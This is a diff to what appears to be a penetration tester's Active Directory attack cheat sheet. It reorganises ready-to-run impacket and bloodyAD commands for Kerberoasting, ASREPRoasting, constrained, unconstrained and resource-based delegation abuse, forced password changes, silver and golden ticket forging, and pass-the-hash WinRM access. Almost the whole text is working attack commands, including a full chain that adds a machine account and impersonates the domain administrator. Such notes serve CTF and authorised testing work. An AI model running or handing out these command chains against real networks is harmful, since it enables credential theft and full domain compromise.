@@ -768,30 +768,30 @@ impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile us
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile usernames_$DC
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile computers_$DC
+while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
 
 [###] ASREPRoast
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
 
+[###] Delegation: Constrained (msDS-AllowedToDelegateTo + TrustedToAuthForDelegation)
+impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
+impacket-getST -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD' -altservice cifs -spn 'time/m3webaw' -impersonate 'Admin.User.Logon'
 
+[###] Delegation: Unconstrained (TRUSTED_FOR_DELEGATION + userAccountControl)
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 
+[###] Delegation: RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
+impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
 impacket-getTGT $DOM/'mypc$':'123qweasdF!'; kcme
 impacket-getST $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; kcme
 
-impacket-getTGT $DOM/'administrator' -hashes ':'; kcme
-evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
-evil-winrm -i $TARGET -u administrator -H ''
-
+[###] Change Password (ForceChangePassword)
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
-while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames
-
-[###] Ticket: Impersonate
-impacket-getST -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD' -altservice cifs -spn 'time/m3webaw' -impersonate 'Admin.User.Logon'
 
 [###] Silver Ticket: Domain SID
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(ObjectClass=user)(objectSid=*)(!(ObjectClass=foreignSecurityPrincipal)))" --attr objectSid | grep -avE 'nTSecurityDescriptor:|distinguishedName:' | cut -d ' ' -f 2 | sed 's/-[0-9]\+$//' | sort -u | sed '/^$/d' | tee silver-ticket
@@ -807,7 +807,6 @@ cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -do
 
 [###] Golden Ticket
 impacket-goldenPac -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$DC
-
 
 [*] (135) RPC
 rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "enumdomusers"
